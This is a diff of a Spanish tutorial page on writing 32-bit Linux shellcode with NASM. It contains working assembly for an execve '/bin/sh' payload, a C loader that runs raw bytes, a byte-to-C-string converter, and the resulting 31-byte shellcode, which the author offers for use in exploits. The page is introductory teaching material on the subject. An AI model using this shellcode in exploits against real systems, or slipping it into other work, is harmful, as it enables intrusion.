@@ -5239,215 +5239,196 @@
 <p><span class="caps">NASM</span> es un ensamblador libre de tipo intel. Lo he elegido porque es con lo que yo estoy familiarizado.</p>
 <p>Como siempre, los que tengan debian o similares:</p>
 <div class="console">
-<p>{% highlight console %}</p>
-<ol>
-	<li>apt-get install nasm<br />
-{% endhighlight %}<br />
-</div></li>
-</ol>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span><span class="w"> </span>apt-get <span class="nb">install </span>nasm</code></pre></figure></div>
 <h2>Linux System Calls</h2>
 <p>Las llamadas a sistema en Linux se hacen con parámetros en los registros e invocando la interrupción 80h.</p>
 <p>Un ejemplo sería:</p>
 <div>
-<p>{% highlight text <span>}<br />
-mov eax,1     ; eax = 1 =&gt; exit syscall<br />
-xor ebx,ebx   ; ebx = 0 =&gt; ebx = int<br />
-int 0&#215;80      ; Ejecutar syscall<br />
-{</span> endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">mov eax,1     ; eax = 1 =&gt; exit syscall
+xor ebx,ebx   ; ebx = 0 =&gt; ebx = int
+int 0x80      ; Ejecutar syscall</code></pre></figure></div>
 <p>Podéis consultar una tabla de syscalls <a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html">aquí</a></p>
 <h2>Ejemplo clásico: ejecutar una shell (/bin/sh)</h2>
 <p>Para ejecutar una shell tenemos que tener en cuenta que debemos administrar un parámetro de cadena, esto es &#8220;/bin/sh&#8221; a la función syscall correspondiente. Pero, ¿cómo hacemos esto si no sabemos en qué parte de la memoria irá nuestra shellcode? Mmmm&#8230; difícil a primera vista.</p>
 <p>Bien, existe un truco. Cuando se realiza un &#8220;call&#8221;, la cima de la pila contiene la siguiente dirección de memoria que va tras ella, así, al hacer &#8220;ret&#8221;, se podrá apuntar el PC (contador de programa) a esa dirección y seguir con el código del programa. Así que &#8230; con estos datos sabemos que la siguiente dirección de memoria tras un &#8220;call&#8221; podemos conseguirla de la pila con &#8220;pop <registro>&#8221;. Bien, si tras ese &#8220;call&#8221; ponemos datos, ya tenemos la forma de apuntar a ellos.</p>
 <p>Ejemplo:</p>
 <div>
-<p>{% highlight text %}<br />
-<span class="caps">BITS</span> 32</p>
-jmp short datos
-<p>código:</p>
-pop esi   ; char [<span class="caps">ESI</span>]   = &#8216;c&#8217;
-; char [ESI+1] = &#8216;a&#8217;
-; char [ESI+2] = &#8216;d&#8217;
-; &#8230;
-; char [ESI+5] = &#8216;a&#8217;
-<p>datos:<br />
- call codigo</p>
-<p>db &#8216;cadena&#8217;<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">BITS 32
+
+ jmp short datos
+
+código:
+
+ pop esi   ; char [ESI]   = 'c'
+           ; char [ESI+1] = 'a'
+           ; char [ESI+2] = 'd'
+           ; ...
+           ; char [ESI+5] = 'a'
+
+datos:
+ call codigo
+
+db 'cadena'</code></pre></figure></div>
 <p>Al final de nuestra variable cadena debería haber un caracter nulo &#8216;\0&#8217; , pero las shellcodes no se llevan muy bien ni con ellos, ni con los retornos de carro y algunas cosas más; así que tenemos que añadirlo nosotros.<br />
 Cuidado con operaciones que tengan 0&#8217;s. Hacer &#8220;mov eax, 0&#8221; hará que el binario compilado contenga caracteres &#8216;\0&#8217;.<br />
 Recordad que para poner algo a 0 basta con hacer un <span class="caps">XOR</span> consigo mismo.</p>
 <div>
-<p>{% highlight text %}<br />
-<span class="caps">BITS</span> 32</p>
-jmp short datos:
-<p>codigo:<br />
- pop esi<br />
- xor eax, eax          ; <span class="caps">EAX</span> = 0 (<span class="caps">EAX</span>/AX/AH/AL)<br />
- mov byte [esi+7], al  ; Cambiamos &#8216;#&#8217; por &#8216;0&#8217;</p>
-<p>datos:<br />
- call codigo</p>
-<p>db &#8216;/bin/sh#&#8217;   ; Termina en &#8216;#&#8217; para reservar la memoria del &#8216;\0&#8217;<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">BITS 32
+
+ jmp short datos:
+codigo:
+ pop esi
+ xor eax, eax          ; EAX = 0 (EAX/AX/AH/AL)
+ mov byte [esi+7], al  ; Cambiamos '#' por '0'
+
+datos:
+ call codigo
+
+db '/bin/sh#'   ; Termina en '#' para reservar la memoria del '\0'</code></pre></figure></div>
 <p>Vale. Ahora, miramos en la tabla de syscalls y vemos que sys_execve es la 11.<br />
 La implementación en C es la siguiente:</p>
 <div>
-<p>{% highlight text <span>}<br />
-int execve (const char *filename, char *const argv [], char *const envp[]);<br />
-{</span> endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">int execve (const char *filename, char *const argv [], char *const envp[]);</code></pre></figure></div>
 <p>Así que necesitamos tres punteros a los argumentos. El primer puntero ya sabemos cómo conseguirlo, el segundo, <span class="caps">NULL</span>, no queremos argumentos y en la opción de envp le metemos un <span class="caps">NULL</span>, que no nos hace falta para nada. Así la llamada a la syscall execve tendra a eax=11 (0xb), ebx = dirección donde empieza &#8216;/bin/sh&#8217;, ecx = <span class="caps">NULL</span> y edx = <span class="caps">NULL</span>.</p>
 <p>Más o menos quedaría así:</p>
 <div>
-<p>{% highlight text %}<br />
-<span class="caps">BITS</span> 32        ; Máquina de 32 bits &#8211; las shellcodes son específicas</p>
-jmp short datos
-<p>codigo:<br />
- pop esi<br />
- xor eax, eax          ; <span class="caps">EAX</span> = 0 (<span class="caps">EAX</span>/AX/AH/AL)<br />
- mov byte [esi+7], al  ; Cambiamos &#8216;#&#8217; por &#8216;0&#8217;<br />
- mov al,11             ; syscall 11<br />
- mov ebx, esi          ; ebx apunta a &#8216;/bin/sh\0&#8217;<br />
- xor ecx,ecx           ; ecx = 0 <span class="caps">NULL</span><br />
- xor edx,edx           ; edx = 0 <span class="caps">NULL</span><br />
- int 0&#215;80              ; syscall!</p>
-<p>datos:<br />
- call codigo</p>
-<p>db &#8216;/bin/sh#&#8217;<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">BITS 32        ; Máquina de 32 bits - las shellcodes son específicas
+
+
+ jmp short datos
+codigo:
+ pop esi
+ xor eax, eax          ; EAX = 0 (EAX/AX/AH/AL)
+ mov byte [esi+7], al  ; Cambiamos '#' por '0'
+ mov al,11             ; syscall 11
+ mov ebx, esi          ; ebx apunta a '/bin/sh\0'
+ xor ecx,ecx           ; ecx = 0 NULL
+ xor edx,edx           ; edx = 0 NULL
+ int 0x80              ; syscall!
+
+datos:
+ call codigo
+
+db '/bin/sh#'</code></pre></figure></div>
 <p>Esto lo grabamos por ejemplo a un archivito llamador &#8220;exec.asm&#8221; y ejecutamos:</p>
 <div class="console">
-<p>{% highlight console %}</p>
-<p>$ nasm -o exec exec.asm<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>nasm <span class="nt">-o</span> <span class="nb">exec </span>exec.asm</code></pre></figure></div>
 <p>Ahora se ha generado un archivito llamado &#8220;exec&#8221;. Ese archivo binario es nuestra shellcode!!! Pero, ¿cómo la probamos? No se puede ejecutar sin más, pues no es un elf, ni tiene ningún formato de ejecutable, es código máquina puro y duro.</p>
 <h2>Probando la shellcode</h2>
 <p>Para probarla podemos usar el siguiente programita en C. Su uso es:</p>
 <div class="console">
-<p>{% highlight console %}</p>
-<p>$ gcc -o testshell testshell.c<br />
-$ ./testshell exec (u otro fichero bin generado por nasm)<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-o</span> testshell testshell.c
+<span class="gp">$</span><span class="w"> </span>./testshell <span class="nb">exec</span> <span class="o">(</span>u otro fichero bin generado por nasm<span class="o">)</span></code></pre></figure></div>
 <p>El programita que carga el fichero como función es:</p>
 <div>
-<p>{% highlight text %}<br />
-/* Coded by brue &#8211; brue.org &#8211; testshell.c */<br />
-#include <stdio.h><br />
-#include <stdlib.h></p>
-<p>#define MAX_SIZE 1000</p>
-<p>int main(int argc, char** argv){</p>
-FILE* f;
-int   b, c=0;
-char*  m;
-void  (*func)(void);
-if (argc&lt;2){
-printf(&#8220;Use: %s <file>\n&#8221;,argv<sup class="footnote" id="fnr0"><a href="#fn0">0</a></sup>);
-return 1;
-}
-f = fopen(argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>,&#8220;r&#8221;);
-if (f){
-m = malloc(MAX_SIZE);
-while((b=fgetc(f))!=<span class="caps">EOF</span>){
-*(m+c)=b;
-if ((c++)==MAX_SIZE) return 3;
-}
-fclose(f);
-printf(&#8220;Executing&#8230;\n&#8221;);
-func = (void (*)(void)) m;
-(*func)();
-return 0;
-}
-else{
-printf(&#8220;Error opening: %s\n&#8221;,argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>);
-return 2;
-}
-<p>}<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">/* Coded by brue - brue.org - testshell.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define MAX_SIZE 1000
+
+int main(int argc, char** argv){
+
+  FILE* f;
+  int   b, c=0;
+  char*  m;
+  void  (*func)(void);
+
+
+  if (argc&lt;2){
+    printf("Use: %s &lt;file&gt;\n",argv[0]);
+    return 1;
+  }
+
+  f = fopen(argv[1],"r");
+  if (f){
+    m = malloc(MAX_SIZE);
+    while((b=fgetc(f))!=EOF){
+      *(m+c)=b;
+      if ((c++)==MAX_SIZE) return 3;
+    }
+    fclose(f);
+    printf("Executing...\n");
+    func = (void (*)(void)) m;
+    (*func)();
+    return 0;
+  }
+  else{
+    printf("Error opening: %s\n",argv[1]);
+    return 2;
+  }
+}</code></pre></figure></div>
 <p>Así que cuando ejecutamos el comando obtenemos:</p>
 <div class="console">
-<p>{% highlight console %}</p>
-<p>$ ./testshell exec<br />
-Executing&#8230;<br />
-$<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./testshell <span class="nb">exec</span>
+<span class="go">Executing...
+</span><span class="gp">$</span></code></pre></figure></div>
 <p>&#8230;carga la shell sh!!! Funciona!!! (con ctrl-d podemos retornar a nuestra shell original).</p>
 <p>Hemos hecho un binario en código máquina que ejecuta una shell en un linux x86 en tan sólo 31 bytes.</p>
 <p>Ahora que tenemos esto, ¿cómo lo usamos en nuestro exploit? Vamos a verlo, con un ejemplo de uso en el lenguaje de sistemas C.</p>
 <h2>Cómo usar el archivo compilado en nuestro código en C</h2>
 <p>Una vez que tenemos nuestro archivo binario creado por nasm podéis usar el siguiente programita en C para convertir vuestra shell en una variable de C. Para compilarlo haremos:</p>
 <div class="console">
-<p>{% highlight console %}</p>
-<p>$ gcc -o hex2c hex2c.c<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-o</span> hex2c hex2c.c</code></pre></figure></div>
 <p>Para usarlo:</p>
 <div class="console">
-<p>{% highlight console %}</p>
-<p>$ ./hex2c exec (o nombre del binario)<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./hex2c <span class="nb">exec</span> <span class="o">(</span>o nombre del binario<span class="o">)</span></code></pre></figure></div>
 <p>Como salida nos encontramos:</p>
 <div class="console">
-<p>{% highlight console %}</p>
-<p>$ brue@doppler:~/svn/brue/personal/hack/shcode$ ./hex2c exec</p>
-<p>char shell[]=<br />
-&#8220;\xeb\x10\x5e\x31\xc0&#8221;<br />
-&#8220;\x88\x46\x07\xb0\x0b&#8221;<br />
-&#8220;\x89\xf3\x31\xc9\x31&#8221;<br />
-&#8220;\xd2\xcd\x80\xe8\xeb&#8221;<br />
-&#8220;\xff\xff\xff\x2f\x62&#8221;<br />
-&#8220;\x69\x6e\x2f\x73\x68&#8221;<br />
-&#8220;\x23&#8221;;</p>
-<p>31 bytes shellcode!<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>brue@doppler:~/svn/brue/personal/hack/shcode<span class="nv">$ </span>./hex2c <span class="nb">exec</span>
+<span class="go">
+char shell[]=
+"\xeb\x10\x5e\x31\xc0"
+"\x88\x46\x07\xb0\x0b"
+"\x89\xf3\x31\xc9\x31"
+"\xd2\xcd\x80\xe8\xeb"
+"\xff\xff\xff\x2f\x62"
+"\x69\x6e\x2f\x73\x68"
+</span><span class="gp">"\x23";</span><span class="w">
+</span><span class="go">
+31 bytes shellcode!</span></code></pre></figure></div>
 <p>Esta variable la podremos usar como shell code en nuestro exploit &#8230; pero eso ya es otra receta.</p>
 <div>
-<p>{% highlight text %}<br />
-/* Coded by brue &#8211; brue.org &#8211; hex2c.c   *</p>
-<ul>
-	<li>*</li>
-	<li>Compile with &#8216;gcc -o hex2c hex2c.c&#8217;  */</li>
-</ul>
-<p>#include <stdio.h></p>
-<p>int main(int argc ,char** argv){</p>
-FILE* f;
-int  b;
-int cont=0;
-if (argc&lt;2){
-printf(&#8220;Use: %s <file>\n&#8221;,argv<sup class="footnote" id="fnr0"><a href="#fn0">0</a></sup>);
-return 1;
-}
-f = fopen(argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>,&#8220;r&#8221;);
-if (f){
-printf(&#8220;\n&#8221;);
-printf(&#8220;char shell[]=\n\&#8221;&quot;);
-while((b=fgetc(f))!=<span class="caps">EOF</span>){
-cont++;
-printf(&#8220;\\x%02x&#8221;,(char*) b);
-if ((cont%5)==0){
-<p>printf(&#8220;\&#8221;\n\&quot;&quot;);<br />
-      }<br />
-    }<br />
-    printf(&#8220;\&#8221;;\n\n&quot;);<br />
-    printf(&#8220;%d bytes shellcode!\n&#8221;,cont);<br />
-    fclose(f);<br />
-  }<br />
-  else{<br />
-    printf(&#8220;Error opening: %s\n&#8221;,argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>);<br />
-    return 2;<br />
-  }</p>
-return 0;
-<p>}<br />
-{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">/* Coded by brue - brue.org - hex2c.c   *
+ *                                      *
+ * Compile with 'gcc -o hex2c hex2c.c'  */
+
+#include &lt;stdio.h&gt;
+
+
+int main(int argc ,char** argv){
+
+  FILE* f;
+  int  b;
+  int cont=0;
+
+  if (argc&lt;2){
+    printf("Use: %s &lt;file&gt;\n",argv[0]);
+    return 1;
+  }
+
+  f = fopen(argv[1],"r");
+  if (f){
+    printf("\n");
+    printf("char shell[]=\n\"");
+    while((b=fgetc(f))!=EOF){
+      cont++;
+      printf("\\x%02x",(char*) b);
+      if ((cont%5)==0){
+	printf("\"\n\"");
+      }
+    }
+    printf("\";\n\n");
+    printf("%d bytes shellcode!\n",cont);
+    fclose(f);
+  }
+  else{
+    printf("Error opening: %s\n",argv[1]);
+    return 2;
+  }
+
+  return 0;
+}</code></pre></figure></div>
 <p>Esta receta es sólo una introducción y pretende ser guía para algún curioso que pare por aquí. No es ejemplo del mejor C, ni del mejor asm x86&#8230;</p>
 <h2>Enlaces</h2>
 <p><a href="http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html">Safemode.org</a><br />
@@ -5517,7 +5498,7 @@ return 0;
           and <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a>.
 	  See <a href="https://github.com/CRySoL/web.source" target="_blank">site sources</a>.
 	  <br/>
-	  Generated at 2020-04-25 02:51:16 -0500
+	  Generated at 2020-04-25 05:57:01 -0500
 	  <br/>
 		<a href="https://github.com/CRySoL/CRySoL.github.io/actions">
 		   <img src="https://github.com/CRySoL/CRySoL.github.io/workflows/Jekyll%20automatic%20build/badge.svg" alt="_built">
